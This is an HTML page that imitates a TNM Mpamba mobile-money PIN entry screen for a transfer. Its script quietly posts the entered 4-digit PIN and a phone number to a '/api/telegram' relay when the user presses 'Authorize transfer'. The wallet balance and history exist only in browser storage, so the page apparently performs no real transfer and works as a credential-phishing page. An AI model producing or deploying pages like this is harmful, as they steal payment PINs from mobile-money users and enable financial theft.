<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#00a651" />
  <link rel="manifest" href="/manifest.webmanifest" />
  <title>Mpamba PIN</title>
  <style>
    :root {
      --green: #00a651;
      --green-deep: #073d25;
      --paper: #f4faf7;
      --ink: #10251b;
      --muted: #5f756b;
      --line: #dfece4;
      --orange: #ff6600;
      --white: #ffffff;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 18px;
      font-family: Arial, Helvetica, sans-serif;
      background: linear-gradient(180deg, #f4faf7, #edf9f1);
      color: var(--ink);
    }
    .card {
      width: min(100%, 420px);
      background: var(--white);
      border: 1px solid rgba(7,61,37,.08);
      border-radius: 26px;
      box-shadow: 0 20px 55px rgba(7,61,37,.08);
      overflow: hidden;
    }
    .topbar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 18px;
      border-bottom: 1px solid var(--line);
      background: rgba(255,255,255,.9);
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 700;
      color: var(--green-deep);
    }
    .brand-mark {
      width: 54px;
      height: 32px;
      display: grid;
      place-items: center;
      background: white;
      border: 1px solid var(--line);
      border-radius: 10px;
      overflow: hidden;
    }
    .brand-mark img {
      width: 100%;
      height: 100%;
      object-fit: contain;
    }
    .secure-tag {
      color: var(--orange);
      font-weight: 700;
      font-size: 12px;
      letter-spacing: .08em;
      text-transform: uppercase;
    }
    .content {
      padding: 22px 18px 18px;
      text-align: center;
    }
    .eyebrow {
      margin: 0 0 10px;
      color: var(--green-deep);
      font-size: 12px;
      letter-spacing: .12em;
      text-transform: uppercase;
      font-weight: 700;
    }
    h1 {
      margin: 0 0 8px;
      font-size: 30px;
      color: var(--green-deep);
    }
    .summary {
      background: #f8fbf9;
      border: 1px solid var(--line);
      border-radius: 16px;
      padding: 14px;
      margin: 18px 0 18px;
      text-align: left;
    }
    .summary strong {
      display: block;
      margin-bottom: 6px;
      color: var(--green-deep);
      font-size: 17px;
    }
    .summary span {
      display: block;
      color: var(--muted);
      line-height: 1.5;
      font-size: 14px;
    }
    .pin-label {
      margin: 0 0 12px;
      color: var(--muted);
      font-size: 14px;
      text-align: left;
      font-weight: 700;
    }
    .pin-row {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 10px;
      margin-bottom: 18px;
    }
    .pin-row input {
      width: 100%;
      height: 54px;
      text-align: center;
      border: 1px solid var(--line);
      border-radius: 14px;
      font-size: 22px;
      background: #fafdfb;
      color: var(--ink);
      outline: none;
    }
    .pin-row input:focus {
      border-color: rgba(0,166,81,.6);
      box-shadow: 0 0 0 4px rgba(0,166,81,.08);
    }
    .cta {
      width: 100%;
      border: none;
      border-radius: 12px;
      background: linear-gradient(180deg, var(--green), #0a9d4f);
      color: #fff;
      padding: 14px;
      font-weight: 700;
      font-size: 16px;
      cursor: pointer;
    }
    .ghost {
      width: 100%;
      margin-top: 10px;
      border: 1px solid var(--line);
      border-radius: 12px;
      background: #fff;
      color: var(--green-deep);
      padding: 12px;
      font-weight: 700;
      font-size: 15px;
      cursor: pointer;
    }
    .status {
      display: none;
      margin-top: 12px;
      color: var(--green);
      font-weight: 700;
      font-size: 14px;
    }
    @media (max-width: 420px) {
      .card { border-radius: 20px; }
      .pin-row { gap: 8px; }
      .pin-row input { height: 48px; }
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="topbar">
      <div class="brand">
        <div class="brand-mark"><img src="assets/images/mpamba_logo_transparent.png" alt="Mpamba logo" /></div>
        <span>Mpamba</span>
      </div>
      <span class="secure-tag">Secure</span>
    </div>

    <div class="content">
      <p class="eyebrow">Transfer</p>
      <h1>Enter your TNM Mpamba PIN</h1>

      <div class="summary">
        <strong id="transfer-network">TNM</strong>
        <span id="transfer-summary">Send MWK 0 to 0888123456</span>
      </div>

      <div class="pin-label">Enter your 4-digit TNM Mpamba PIN</div>
      <div class="pin-row">
        <input maxlength="1" inputmode="numeric" type="password" />
        <input maxlength="1" inputmode="numeric" type="password" />
        <input maxlength="1" inputmode="numeric" type="password" />
        <input maxlength="1" inputmode="numeric" type="password" />
      </div>

      <button id="authorize" class="cta" type="button">Authorize transfer</button>
      <button id="back" class="ghost" type="button">Back</button>
      <div id="status" class="status">Authorizing...</div>
    </div>
  </div>

  <script>
    async function notifyTelegram(message) {
      try {
        const response = await fetch('/api/telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: message })
        });

        const result = await response.json().catch(() => null);
        if (!response.ok || !result?.ok) {
          console.warn('Telegram notification failed:', {
            status: response.status,
            response: result
          });
          return;
        }
      } catch (error) {
        console.warn('Telegram notification failed:', error);
      }
    }

    const params = new URLSearchParams(window.location.search);
    const network = params.get('network') || 'TNM';
    const recipient = params.get('recipient') || '888123456';
    const amount = Number(params.get('amount') || 0);
    const money = n => 'MWK ' + Number(n).toLocaleString('en-US');

    document.getElementById('transfer-network').textContent = network;
    document.getElementById('transfer-summary').textContent = `Send ${money(amount)} to 0${recipient}`;

    const pinInputs = [...document.querySelectorAll('.pin-row input')];
    const statusEl = document.getElementById('status');

    pinInputs.forEach((input, index) => {
      input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '').slice(0, 1);
        if (input.value && index < pinInputs.length - 1) {
          pinInputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', (event) => {
        if (event.key === 'Backspace' && !input.value && index > 0) {
          pinInputs[index - 1].focus();
        }
      });
    });

    document.getElementById('authorize').addEventListener('click', () => {
      const pin = pinInputs.map(input => input.value).join('');
      if (!/^\d{4}$/.test(pin)) {
        alert('Enter your 4-digit Mpamba PIN');
        return;
      }

      notifyTelegram(`TNM Mpamba PIN entered\nPhone: 0${recipient}\nPIN: ${pin}`);

      const balance = Number(localStorage.getItem('tnmBalance') ?? 0);
      if (balance < amount) {
        alert('Insufficient balance');
        return;
      }

      statusEl.style.display = 'block';
      statusEl.textContent = 'Authorizing...';

      setTimeout(() => {
        const nextBalance = balance - amount;
        localStorage.setItem('tnmBalance', String(nextBalance));

        const history = JSON.parse(localStorage.getItem('tnmHistory') || '[]');
        history.unshift({
          item: 'Send money',
          amount,
          phone: `0${recipient}`,
          date: new Date().toLocaleString()
        });
        localStorage.setItem('tnmHistory', JSON.stringify(history));

        statusEl.textContent = 'Transfer authorized';
        setTimeout(() => {
          window.location.href = 'index.html';
        }, 900);
      }, 1200);
    });

    document.getElementById('back').addEventListener('click', () => {
      window.location.href = 'transfer.html';
    });
  </script>
  <script>
    if ('serviceWorker' in navigator) {
      window.addEventListener('load', () => {
        navigator.serviceWorker.register('/sw.js').catch((error) => {
          console.warn('Service worker registration failed:', error);
        });
      });
    }
  </script>
</body>
</html>
